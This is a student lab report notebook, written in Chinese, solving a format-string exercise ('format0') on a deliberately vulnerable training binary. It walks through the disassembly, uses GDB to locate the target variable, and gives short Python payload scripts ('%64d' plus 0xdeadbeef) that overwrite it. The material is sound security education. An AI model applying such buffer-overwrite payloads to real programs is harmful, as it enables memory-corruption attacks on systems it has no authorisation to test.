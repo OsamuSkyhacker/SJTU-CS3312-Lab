{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## CS3312 Lab Report Format0\n",
    "\n",
    "Osamu Takenaka 520030990026"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 源码分析"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "x86汇编代码(由objdump得到)：\n",
    "\n",
    "```asm\n",
    "080483f4 <vuln>:\n",
    " 80483f4:\t55                   \tpush   %ebp\n",
    " 80483f5:\t89 e5                \tmov    %esp,%ebp\n",
    " 80483f7:\t83 ec 68             \tsub    $0x68,%esp\n",
    " 80483fa:\tc7 45 f4 00 00 00 00 \tmovl   $0x0,-0xc(%ebp)\n",
    " 8048401:\t8b 45 08             \tmov    0x8(%ebp),%eax\n",
    " 8048404:\t89 44 24 04          \tmov    %eax,0x4(%esp)\n",
    " 8048408:\t8d 45 b4             \tlea    -0x4c(%ebp),%eax\n",
    " 804840b:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 804840e:\te8 ed fe ff ff       \tcall   8048300 <sprintf@plt>\n",
    " 8048413:\t8b 45 f4             \tmov    -0xc(%ebp),%eax\n",
    " 8048416:\t3d ef be ad de       \tcmp    $0xdeadbeef,%eax\n",
    " 804841b:\t75 0c                \tjne    8048429 <vuln+0x35>\n",
    " 804841d:\tc7 04 24 10 85 04 08 \tmovl   $0x8048510,(%esp)\n",
    " 8048424:\te8 07 ff ff ff       \tcall   8048330 <puts@plt>\n",
    " 8048429:\tc9                   \tleave  \n",
    " 804842a:\tc3                   \tret    \n",
    "\n",
    "0804842b <main>:\n",
    " 804842b:\t55                   \tpush   %ebp\n",
    " 804842c:\t89 e5                \tmov    %esp,%ebp\n",
    " 804842e:\t83 e4 f0             \tand    $0xfffffff0,%esp\n",
    " 8048431:\t83 ec 10             \tsub    $0x10,%esp\n",
    " 8048434:\t8b 45 0c             \tmov    0xc(%ebp),%eax\n",
    " 8048437:\t83 c0 04             \tadd    $0x4,%eax\n",
    " 804843a:\t8b 00                \tmov    (%eax),%eax\n",
    " 804843c:\t89 04 24             \tmov    %eax,(%esp)\n",
    " 804843f:\te8 b0 ff ff ff       \tcall   80483f4 <vuln>\n",
    " 8048445:\tc3                   \tret    \n",
    " 8048444:\tc9                   \tleave  \n",
    "```\n",
    "\n",
    "\n",
    "C语言源代码：\n",
    "```c\n",
    "#include <stdlib.h>\n",
    "#include <unistd.h>\n",
    "#include <stdio.h>\n",
    "#include <string.h>\n",
    "\n",
    "void vuln(char *string)\n",
    "{\n",
    "    volatile int target;\n",
    "    char buffer[64];\n",
    "\n",
    "    target = 0;\n",
    "\n",
    "    sprintf(buffer, string);\n",
    "\n",
    "    if(target == 0xdeadbeef) {\n",
    "        printf(\"you have hit the target correctly :)\\n\");\n",
    "    }\n",
    "}\n",
    "\n",
    "int main(int argc, char **argv)\n",
    "{\n",
    "    vuln(argv[1]);\n",
    "}\n",
    "```\n",
    "\n",
    "这其实是个典型的栈溢出漏洞，和format关系不大。在vuln函数中，sprintf函数的第一个参数是一个栈上的buffer，第二个参数是用户输入的字符串，这个字符串会被写入到buffer中。由于没有对用户输入的长度进行检查，所以用户可以输入任意长度的字符串，从而覆盖栈上的其他数据。在这个程序中，我们可以通过覆盖target的值为0xdeadbeef来触发漏洞。\n",
    "\n",
    "\n",
    "- 变量位置确定：\n",
    "\n",
    "    从这句汇编\n",
    "    ```asm\n",
    "    80483fa:\tc7 45 f4 00 00 00 00 \tmovl   $0x0,-0xc(%ebp)\n",
    "    ```\n",
    "    可以看出，target变量的位置是ebp-0xc\n",
    "    从C语言代码中，我们可以先假设target的位置就在buffer的后面，构造一个测试的攻击脚本，然后在gdb里再具体确定buffer和target的位置。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### GDB调试\n",
    "\n",
    "测试攻击脚本：\n",
    "```python\n",
    "buffer = 'A' * 64\n",
    "modified = '\\xef\\xbe\\xad\\xde'\n",
    "padding = buffer + modified\n",
    "print padding\n",
    "```\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/DWKwb99AmJOfVSYpL297D24TVhxf6RIlbzbKWW-NsVo.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "在vuln函数中，执行完参数输入指令后，我们打印栈的状态以及$ebp的值：\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/R71yIyC8oxrLt2rqChDHjHlhqyQiKD8TkrviTvbg4rE.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "可以看到，`$ebp = 0xbffffbf8`, `$ebp-0xc = 0xbffffbec`，所以`target`的位置是`0xbffffbec`，正好就是图中`buffer`区域（大片0x41）的后面，即`0xdeadbeef`的位置，我们的假设是正确的\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/R7lYZcuQwLPXSocw5OGsNOBbfSABfmjjKP4z8niq8NE.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "可以看到攻击成功，程序输出了`you have hit the target correctly :)`，说明我们成功地修改了`target`的值为`0xdeadbeef`。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "等等！题目说输入应当小于 10 字节，好吧我们改一下\n",
    "\n",
    "#### 攻击脚本内容\n",
    "\n",
    "script_format0.py:\n",
    "\n",
    "```python\n",
    "buffer = '%64d'\n",
    "modified = '\\xef\\xbe\\xad\\xde'\n",
    "padding = buffer + modified\n",
    "print padding\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "    \n",
    "在终端中运行：\n",
    "\n",
    "```bash\n",
    "./format0 $(python script_format0.py)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### 结果（非GDB环境）\n",
    "\n",
    "<img src=\"https://cdn.mathpix.com/snip/images/h9NkIhuSeMqiC5e9H7pau02oJpKcRDv7tPQKLVlvd5I.original.fullsize.png\" width=\"50%\">\n",
    "\n",
    "攻击成功"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
